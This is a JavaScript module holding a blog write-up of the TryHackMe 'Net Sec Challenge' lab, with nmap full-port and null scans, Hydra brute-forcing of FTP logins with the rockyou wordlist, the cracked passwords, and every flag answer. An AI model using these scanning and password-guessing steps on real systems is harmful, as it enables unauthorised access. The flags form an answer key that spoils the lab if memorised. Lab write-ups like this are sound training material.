export default {
    id: 'net-sec-challenge',
    title: 'Net Sec Challenge',
    category: 'TryHackME',
    difficulty: 'Medium',
    tags: ['Pen Testing', 'Network Security'],
    date: '2026-03-08T12:00:00',
    excerpt: 'Write up and walkthrough of Net Sec Challenge room on TryHackMe',
    content: `
This is a writeup and walkthrough of Net Sec Challenge room on TryHackMe.

⸻⸻⸻⸻⸻

### Task 1 Introduction

Use this challenge to test your mastery of the skills you have acquired in the Network Security module. All the questions in this challenge can be solved using only \`nmap\`, \`telnet\`, and \`hydra\`.

⸻⸻⸻⸻⸻

### Task 2 Challenge Questions

You can answer the following questions using Nmap, Telnet, and Hydra.

**Answer the questions below**⸻⸻⸻⸻⸻

What is the highest port number being open less than 10,000?
**Answer:** 8080
**Reason:** Run \`nmap -sS -sV -sC -p 1-65535 MACHINE\_IP\`.

There is an open port outside the common 1000 ports; it is above 10,000. What is it?
**Answer:** 10021
**Reason:** Run \`nmap -sS -sV -sC -p 1-65535 MACHINE\_IP\`.

How many TCP ports are open?
**Answer:** 6
**Reason:** Run \`nmap -sS -sV -sC -p 1-65535 MACHINE\_IP\`.

What is the flag hidden in the HTTP server header?
**Answer:** THM{web_server_25352}
**Reason:** Run \`nmap -sS -sV -sC -p 1-65535 MACHINE\_IP\`.

What is the flag hidden in the SSH server header?
**Answer:** THM{946219583339}
**Reason:** Run \`nmap -sS -sV -sC -p 1-65535 MACHINE\_IP\`.

We have an FTP server listening on a nonstandard port. What is the version of the FTP server?
**Answer:** vsftpd 3.0.5
**Reason:** Run \`nmap -sS -sV -sC -p 1-65535 MACHINE\_IP\`.

We learned two usernames using social engineering: \`eddie\` and \`quinn\`. What is the flag hidden in one of these two account files and accessible via FTP?
**Answer:** THM{321452667098}
**Reason:**
1. Run \`hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://MACHINE\_IP:10021\`. I find that the password is \`jordan\`.
2. Run \`hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://MACHINE\_IP:10021\`. I find that the password is \`andrea\`.
3. Run \`ftp MACHINE\_IP 10021\`. Try user \`eddie\` with password \`jordan\`, but there is nothing in the ftp directory. So, move on to try user \`quinn\` with password \`andrea\`, there is a file called \`ftp_flag.txt\`.
4. Run \`get ftp_flag.txt\`. Then \`exit\` to diconnect from the ftp connection.
5. Run \`ls\` on the current directory to see the new downloaded file and run \`cat ftp_flag.txt\` to read the flag.

Browsing to http://10.65.190.188:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?
**Answer:** THM{f7443f99}
**Reason:** Run \`nmap -sN MACHINE\_IP\`

⸻⸻⸻⸻⸻

### Task 3 Summary

Congratulations. In this module, we have learned about passive reconnaissance, active reconnaissance, Nmap, protocols and services, and attacking logins with Hydra.
`
}